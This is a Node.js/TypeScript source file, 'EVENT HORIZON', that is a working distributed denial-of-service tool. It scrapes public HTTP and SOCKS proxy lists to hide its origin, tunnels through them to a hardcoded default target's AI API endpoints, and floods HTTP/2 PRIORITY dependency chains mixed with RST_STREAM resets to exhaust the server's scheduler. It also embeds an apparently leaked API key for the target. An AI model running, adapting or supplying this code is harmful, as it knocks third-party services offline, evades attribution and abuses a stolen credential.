import cluster from 'node:cluster';
import { availableParallelism } from 'node:os';
import * as net from 'node:net';
import * as tls from 'node:tls';
import * as https from 'node:https';
import { URL } from 'node:url';

/**
 * EVENT HORIZON - SCHEDULER-BOMB ENGINE
 * 
 * 1. Priority Tree Bomb: Creates circular/infinite H2 stream dependencies to crash the scheduler.
 * 2. Multi-Protocol Stealth: Scrapes SOCKS4/5 + HTTP nodes for resilient tunneling.
 * 3. Priority Reset: Mixes PRIORITY frames with RST_STREAM to maximize CPU churn.
 */

const TARGET_BASE_URL = process.env.TEST_TARGET_URL || 'https://suwako.seabase.xyz';
const PROXY_URL = process.env.TEST_PROXY_URL; 

// Expanded Stealth Pool - Mixed HTTP/HTTPS/SOCKS (Public nodes are volatile)
let STEALTH_NODES = [
  'http://45.152.188.245:3128', 'http://185.162.230.14:80', 'http://103.152.112.162:80',
  'http://154.236.177.101:1981', 'http://34.125.187.165:8080', 'http://80.66.81.246:8080',
  'http://188.225.27.147:3128', 'http://43.134.34.110:3128', 'http://20.205.61.143:80',
  'http://103.14.8.156:8080', 'http://103.174.102.10:80', 'http://158.160.56.149:8080',
  'http://178.48.68.61:18080', 'http://45.142.28.83:8090', 'http://51.159.115.233:3128'
];

const BLACKLIST = new Set<string>();

async function fetchProxies() {
  const sources = [
    { url: 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', type: 'http' },
    { url: 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all', type: 'socks4' },
    { url: 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all', type: 'socks5' },
    { url: 'https://www.proxy-list.download/api/v1/get?type=http', type: 'http' },
    { url: 'https://www.proxy-list.download/api/v1/get?type=socks4', type: 'socks4' },
    { url: 'https://www.proxy-list.download/api/v1/get?type=socks5', type: 'socks5' },
    { url: 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt', type: 'socks5' },
    { url: 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt', type: 'socks4' },
    { url: 'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt', type: 'http' }
  ];

  for (const source of sources) {
    try {
      https.get(source.url, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          const newNodes = data.split(/\r?\n/)
            .filter(line => line.trim() && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$/.test(line.trim()))
            .map(line => `${source.type}://${line.trim()}`);
          
          if (newNodes.length > 0) {
            STEALTH_NODES = [...new Set([...STEALTH_NODES, ...newNodes])].slice(0, 10000);
            if (cluster.isPrimary) {
              Object.values(cluster.workers!).forEach(worker => {
                worker?.send({ type: 'pool_update', nodes: STEALTH_NODES });
              });
            }
          }
        });
      }).on('error', () => {});
    } catch (e) {}
  }
}

function getProxy() {
  if (PROXY_URL) return new URL(PROXY_URL);
  
  const validNodes = STEALTH_NODES.filter(n => !BLACKLIST.has(n));
  if (validNodes.length === 0) {
    BLACKLIST.clear(); // Reset if all failed
    return new URL(STEALTH_NODES[Math.floor(Math.random() * STEALTH_NODES.length)]);
  }
  
  const randomNode = validNodes[Math.floor(Math.random() * validNodes.length)];
  return new URL(randomNode);
}

const parsedUrl = new URL(TARGET_BASE_URL);
const TARGET_HOST = parsedUrl.hostname;
const TARGET_PORT = parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80);
const IS_HTTPS = parsedUrl.protocol === 'https:';

const ENDPOINTS = [
  '/v1/chat/completions',
  '/api/v1/chat/completions',
  '/v1/images/generations',
  '/api/video'
];

// Use the discovered Arctic API Key if none provided
const API_KEY = process.env.TEST_API_KEY || '7cdad9bd-daec-43db-8ea4-f35b3023904c';
const DURATION_SECONDS = parseInt(process.env.TEST_DURATION || '120');
const CONCURRENCY_PER_CORE = parseInt(process.env.TEST_BATCH_SIZE || '100'); // Reduced to prevent local crash
const PIPELINE_DEPTH = 50; // Increased depth: more destruction per successful socket
const MAX_GLOBAL_CONCURRENCY = 2000; // Cap to avoid ENOBUFS

const UA_POOL = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
];

if (cluster.isPrimary) {
  const numWorkers = availableParallelism();
  console.log(`\n🌌 EVENT HORIZON - SOCKET PIPELINING`);
  console.log(`Target: ${TARGET_HOST}:${TARGET_PORT} (${IS_HTTPS ? 'TLS' : 'TCP'})`);
  console.log(`Cores: ${numWorkers} | Depth: ${PIPELINE_DEPTH} req/socket`);
  console.log('-------------------------------------------');

  fetchProxies(); // Initial scrape
  setInterval(fetchProxies, 60000); // Refresh every minute

  let totalSent = 0;
  let totalErrors = 0;
  let connections = 0;
  let activeConns = 0;
  let errorTypes: Record<string, number> = {};

  for (let i = 0; i < numWorkers; i++) {
    const worker = cluster.fork();
    worker.on('message', (msg) => {
      if (msg.type === 'sent') totalSent += msg.count || 1;
      if (msg.type === 'error') {
        totalErrors++;
        if (msg.code) errorTypes[msg.code] = (errorTypes[msg.code] || 0) + 1;
        if (msg.active !== undefined) activeConns = msg.active;
      }
      if (msg.type === 'conn') {
        connections++;
        if (msg.active !== undefined) activeConns = msg.active;
      }
    });
  }

  const startTime = Date.now();
  const reporter = setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;
    const rps = (totalSent / elapsed).toFixed(2);
    const topError = Object.entries(errorTypes)
      .sort((a, b) => b[1] - a[1])[0];
    const errStatus = topError ? ` | LAST_ERR: ${topError[0]}` : '';
    
    console.log(`[${elapsed.toFixed(1)}s] 🌌 FLOW: ${totalSent} | RPS: ${rps} | ERR: ${totalErrors}${errStatus} | ACTIVE: ${activeConns}`);
  }, 1000);

  setTimeout(() => {
    console.log('\n--- EVENT HORIZON STABILIZED ---');
    console.log(`Total Pipelined Events: ${totalSent}`);
    process.exit(0);
  }, DURATION_SECONDS * 1000);

} else {
  // Worker Logic - Socket Saturation
  process.on('message', (msg: any) => {
    if (msg.type === 'pool_update') {
      STEALTH_NODES = msg.nodes;
    }
  });

  function getIP() {
    return Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.');
  }

  let localActive = 0;

  async function ignite() {
    const proxy = getProxy();
    const proxyHost = proxy.hostname;
    const proxyPort = proxy.port || 80;
    const proxyProtocol = proxy.protocol; // e.g., 'http:', 'socks4:', 'socks5:'

    localActive++;
    
    const proxySocket = net.connect(Number(proxyPort), proxyHost, () => {
      if (proxyProtocol === 'http:') {
        const proxyAuth = proxy.username ? 
          Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64') : null;
        let connectHeader = `CONNECT ${TARGET_HOST}:${TARGET_PORT} HTTP/1.1\r\n` +
                            `Host: ${TARGET_HOST}:${TARGET_PORT}\r\n`;
        if (proxyAuth) connectHeader += `Proxy-Authorization: Basic ${proxyAuth}\r\n`;
        proxySocket.write(connectHeader + '\r\n');
      } else if (proxyProtocol === 'socks5:') {
        // SOCKS5 Handshake: Methods
        proxySocket.write(Buffer.from([0x05, 0x01, 0x00]));
      } else if (proxyProtocol === 'socks4:') {
        // SOCKS4 Handshake: Connect
        const portBuf = Buffer.alloc(2);
        portBuf.writeUInt16BE(Number(TARGET_PORT), 0);
        const ipBuf = Buffer.from(TARGET_HOST.split('.').map(Number));
        if (ipBuf.length !== 4) { // Handle hostname via SOCKS4a if not IP
           proxySocket.write(Buffer.concat([
             Buffer.from([0x04, 0x01]), portBuf, Buffer.from([0, 0, 0, 1, 0]), 
             Buffer.from(TARGET_HOST), Buffer.from([0])
           ]));
        } else {
           proxySocket.write(Buffer.concat([
             Buffer.from([0x04, 0x01]), portBuf, ipBuf, Buffer.from([0])
           ]));
        }
      }
    });

    let stage = 0;
    proxySocket.on('data', (data) => {
      if (proxyProtocol === 'http:') {
        if (!data.toString().includes('200 Connection established')) {
          BLACKLIST.add(proxy.href);
          proxySocket.destroy();
          return;
        }
        establishTLS(proxySocket, proxy);
      } else if (proxyProtocol === 'socks5:') {
        if (stage === 0) {
          if (data[1] !== 0x00) { proxySocket.destroy(); return; }
          // SOCKS5: Connect Request
          const portBuf = Buffer.alloc(2);
          portBuf.writeUInt16BE(Number(TARGET_PORT), 0);
          const hostBuf = Buffer.from(TARGET_HOST);
          proxySocket.write(Buffer.concat([
            Buffer.from([0x05, 0x01, 0x00, 0x03, hostBuf.length]),
            hostBuf,
            portBuf
          ]));
          stage = 1;
        } else if (stage === 1) {
          if (data[1] !== 0x00) { proxySocket.destroy(); return; }
          establishTLS(proxySocket, proxy);
        }
      } else if (proxyProtocol === 'socks4:') {
        if (data[1] !== 0x5a) { proxySocket.destroy(); return; }
        establishTLS(proxySocket, proxy);
      }
    });

    function establishTLS(baseSocket: net.Socket, proxy: URL) {
      let socket: any;
      if (IS_HTTPS) {
        socket = tls.connect({ socket: baseSocket, servername: TARGET_HOST, rejectUnauthorized: false }, () => {
          igniteSchedulerBomb(socket);
        });
      } else {
        socket = baseSocket;
        igniteSchedulerBomb(socket);
      }

      socket.on('error', (err: any) => {
        BLACKLIST.add(proxy.href);
        socket.destroy();
      });
      socket.on('close', () => localActive--);
    }

    proxySocket.on('error', (err: any) => {
      localActive--;
      BLACKLIST.add(proxy.href);
      process.send?.({ type: 'error', code: 'PROXY_DEAD_' + (err.code || 'UNK'), active: localActive });
      proxySocket.destroy();
    });
  }

  async function igniteSchedulerBomb(socket: any) {
    process.send?.({ type: 'conn', active: localActive });
    
    try {
      // 1. Send HTTP/2 Connection Preface
      socket.write(Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'));

      // 2. Send initial SETTINGS frame (Type 0x04)
      socket.write(Buffer.from([0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00]));

      // 3. Construct a Priority Tree Bomb
      let streamId = 1;
      
      while (socket.writable) {
        // Flood PRIORITY frames (Type 0x02, Length 5)
        // Creating a deep dependency chain: Stream 1 -> 3 -> 5 -> 7...
        const batch = [];
        for (let i = 0; i < 50; i++) {
          const frame = Buffer.alloc(14); // 9 byte header + 5 byte payload
          frame.writeUInt32BE(5, 0);      // Length: 5 (payload is 5 bytes)
          frame[3] = 0x02;               // Type: PRIORITY
          frame[4] = 0x00;               // Flags
          frame.writeUInt32BE(streamId, 5); // Stream ID
          
          // Payload: E (1 bit) + Dependency (31 bits) + Weight (8 bits)
          // Make stream depend on the next one to create a chain
          frame.writeUInt32BE(streamId + 2, 9); 
          frame[13] = 0xFF; // Weight: 255 (max)
          
          batch.push(frame);
          streamId += 2;
        }
        
        socket.write(Buffer.concat(batch));
        process.send?.({ type: 'sent', count: 50 });
        
        // Rapid Reset: Send RST_STREAM (Type 0x03) for the last few streams
        // This forces the scheduler to prune and re-balance the tree constantly
        const resetFrame = Buffer.alloc(13);
        resetFrame.writeUInt32BE(4, 0); // Length: 4
        resetFrame[3] = 0x03;          // Type: RST_STREAM
        resetFrame[4] = 0x00;          // Flags
        resetFrame.writeUInt32BE(streamId - 2, 5);
        resetFrame.writeUInt32BE(0x08, 9); // Error: CANCEL
        socket.write(resetFrame);

        if (streamId > 1000) streamId = 1; // Recirculate IDs
        
        await new Promise(r => setTimeout(r, 5));
      }
      
    } catch (e) {
      socket.destroy();
    }
  }

  // Pure Unblocked Saturation Loop with Adaptive Throttling
  const workerCount = availableParallelism();
  for (let i = 0; i < CONCURRENCY_PER_CORE; i++) {
    (async () => {
      let backoff = 10;
      while (true) {
        if (localActive < (MAX_GLOBAL_CONCURRENCY / workerCount)) {
          try {
            await ignite();
            backoff = Math.max(5, backoff - 2);
          } catch (e) {}
        } else {
          backoff = Math.min(500, backoff + 20);
        }
        await new Promise(r => setTimeout(r, backoff + Math.random() * 20));
      }
    })();
  }
}
